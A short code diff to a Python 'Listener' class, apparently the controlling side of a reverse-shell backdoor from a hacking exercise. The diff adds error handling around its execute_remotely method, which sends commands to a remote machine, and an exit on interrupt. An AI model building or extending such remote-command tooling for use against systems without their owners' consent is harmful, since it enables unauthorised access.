@@ -28,10 +28,13 @@ class Listener:
                 continue
 
     def execute_remotely(self, command):
-        self.reliable_send(command)
-        result = self.reliable_receive().encode("utf-8")
-        result = result.decode("utf-8")
-        return result
+        try:
+            self.reliable_send(command)
+            result = self.reliable_receive().encode("utf-8")
+            result = result.decode("utf-8")
+            return result
+        except AttributeError:
+            return "[-] AttributeError"
 
     def run(self):
         try:
@@ -42,6 +45,7 @@ class Listener:
         except KeyboardInterrupt:
             print("\n[-] Quiting")
             self.connection.close()
+            exit()
 
 
 if __name__ == "__main__":
